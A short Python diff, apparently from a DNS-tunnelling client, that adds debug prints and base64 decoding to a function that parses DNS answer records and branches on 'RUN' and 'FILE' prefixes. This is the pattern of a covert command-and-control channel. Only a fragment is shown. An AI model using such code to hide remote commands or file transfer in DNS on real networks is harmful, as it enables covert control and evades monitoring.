@@ -24,10 +24,19 @@ def parse_packet(packet):
         global cond
         
         if packet.haslayer(DNS): 
+            print("client in parse")
             cond = 1
-            get_an = packet[DNS].qd.rdata
-            prefix_packet = check_prefix(get_an)     
+            #get_an = packet[DNS].qd.rdata
+            get_an =  packet[1][DNSRR].rdata
+            print("answer:")
+            print(get_an)
+            #prefix_packet = check_prefix(get_an)     
+            prefix_packet = check_prefix(base64.b64decode(get_an))
+            print("prefix:")
+            print(prefix_packet)
             data_recieved = extract_data(get_an,prefix_packet)
+            print("data receieved:")
+            print(data_recieved)
             #pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
             
             if prefix_packet == RUN or prefix_packet == FILE:
